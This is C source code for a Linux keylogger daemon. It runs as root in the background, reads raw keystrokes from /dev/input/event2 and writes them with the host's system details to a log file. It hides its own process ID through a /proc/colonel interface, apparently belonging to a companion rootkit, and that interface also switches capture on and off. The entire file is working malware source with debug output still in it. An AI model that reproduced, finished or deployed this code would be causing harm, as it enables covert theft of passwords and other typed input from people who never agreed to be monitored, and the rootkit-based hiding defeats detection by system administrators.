// DYNAMICALLY FIND EVENT!!!!
// Maybe use structs input_handle, input_dev, input_handler, or input_dev to determine dev/input/eventX
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <linux/input.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <inttypes.h>
#include <time.h>
#include <fcntl.h>
#include <stdarg.h>

FILE *error_log = NULL;										/* error log */


void daemonize(void) {
	pid_t process_id = 0;
	pid_t sid = 0;
	process_id = fork();									/* fork a child process */

	if (process_id < 0) {
		printf("ERROR: fork failure\n");
		exit(1);
	}
	if (process_id > 0) {									/* exits the parent process */
		exit(0);
	}

	umask(0);												/* unmask the file mode */
	sid = setsid();											/* set unique session for 
															 * child process */
	if (sid < 0) {
		exit(1);
	}

	chdir("/opt/");											/* change daemon working directory */

	close(STDIN_FILENO);
	close(STDOUT_FILENO);
	close(STDERR_FILENO);

}

int setup_dirs(void) {
    return mkdir("./col_log", S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);     /* log directory */
}

int hide_pid(void) {
	char dpid[10];								 	
	pid_t child_pid = getpid();							                     /* get keylogger pid */
	int control_file;
	time_t curtime;
	time(&curtime); // set the current time
	
       	control_file = open("/proc/colonel", O_WRONLY);					/* open for write to hide keylogger pid */

	if (!control_file) {
		fprintf(error_log, "ERROR: /proc/colonel not found -- %s", ctime(&curtime));
		exit(1);
	}

	sprintf(dpid, "hp%jd", (intmax_t)child_pid);			                 /* forms command */
	write(control_file, dpid, sizeof(dpid));						                 /* passes command to the colonel */
	fprintf(error_log, "PID: %jd -- %s", (intmax_t)child_pid, ctime(&curtime));     /* records current pid to log */
	close(control_file);
	return 0;
}

int main(void) {
	FILE *evlog;									/* device input log */
	int control_file;
	int input_device;								/* will read from device event file */
	int dir;									/* log directory */
	struct utsname unameData;								/* struct provides system information */
	uname(&unameData);										/* provides system information */
	char listening = 1;										/* toggles keylogger on/off */
	char cmd[1024];											/* stores commands */
	char kl[13] = "keylogger: 1";							/* defines what keylogger is listening for 
															 * on /proc/colonel */
	char *toggle;											/* listens for keylogger cmd */
	struct input_event ev;									/* using input_event so we know 

															 * what we're reading from the 
															 * event file */
	time_t curtime;

	daemonize();
	setup_dirs();

	error_log = fopen("./col_log/log.txt", "a+"); 					                       /* daemon log */
	input_device = open("/dev/input/event2", O_RDONLY);			                           /* key event file */

	hide_pid();

	fprintf(error_log, "I'M AWAKE!!! -- listening: %d", listening);


	fprintf(error_log, "NO ERRORS FOR YOU! -- listening: %d", listening);
	// findev = open('/proc/bus/input/devices', O_RDONLY);
/*
* DYNAMICALLY DISCOVER CORRECT EVENT (/proc/bus/input/devices) 327
*/	fprintf(error_log, "NOT ROOT! -- listening: %d", listening);
	if (geteuid() != 0) {									                 /* check if user is root */
		fprintf(error_log, "ERROR: user not root -- %s", ctime(&curtime));
		return 1;
	}
    fprintf(error_log, "JUST KIDDING, NOT WHILE -- listening: %d", listening);
	while(1) {				
		fflush(error_log);
		read(input_device, &ev, sizeof(struct input_event));			                  /* read from /dev/input/eventX */
		control_file = open("/proc/colonel", O_RDONLY);                               /* read from /proc/colonel */
		read(control_file, cmd, sizeof(cmd));						                  /* read from /proc/colonel */
		toggle = strstr(cmd, kl);							                  /* looks for change in /proc/colonel */
        fprintf(error_log, "In while (no if), control_file open and reading -- listening: %d, toggle: %s", listening, toggle);

		if ((0 == listening) && (toggle != NULL)) {
            fprintf(error_log, "In 1st if -- listening: %d, toggle: %s", listening, toggle);
			listening = !listening;
            evlog = fopen("./col_log/evlog.txt", "a+");                       /* key log */
            if (NULL == evlog) {
                fprintf(error_log, "ERROR: evlog couldn't be opened -- %s", ctime(&curtime));
                return 1;
            }
			fprintf(evlog, "\n\n%s", ctime(&curtime));				          /* timestamp */
			fprintf(evlog, "%s\n%s\n%s | %s | %s\n\n-", 			          /* system data */
					unameData.nodename, unameData.version,
					unameData.sysname, unameData.release, 
					unameData.machine);
			fflush(evlog);
			fprintf(error_log, "Begin listening -- %s", ctime(&curtime));
			close(control_file);
            fprintf(error_log, "Leaving 1st if, control_file closed -- listening: %d, toggle: %s", listening, toggle);
			continue;

		} else if ((1 == ev.type) && (1 == listening)) {	                  /* if typing (ev.type = 1) and keylogger is on */
			fprintf(error_log, "In 2nd if, control_file still closed -- listening: %d, toggle: %s", listening, toggle);
            fprintf(evlog, "%i,%i-", ev.code, ev.value);	                  /* grabs keyboard input -- 
                    														   * ev.code = keycode
                    														   * ev.value = key state (0: key up, 1: key down) */
			fflush(evlog);

			control_file = open("/proc/colonel", O_RDONLY | O_NONBLOCK);
            fprintf(error_log, "In bottom of 2nd if, control_file open and non-blocking -- listening: %d, toggle: %s", listening, toggle);
			if (NULL == toggle) {
				listening = !listening;
                fclose(evlog);
				fprintf(error_log, "End listening -- %s", ctime(&curtime));
				// fprintf(evlog, "\nEnd listening | %s", ctime(&curtime));
				// fflush(evlog);
                fprintf(error_log, "In nested if, control_file open -- listening: %d, toggle: %s", listening, toggle);
				close(control_file);
                fprintf(error_log, "In nested if, control_file closed -- listening: %d, toggle: %s", listening, toggle);
				continue;
			}
		}
	}

	fclose(evlog);
	fclose(error_log);
	return 0;
}
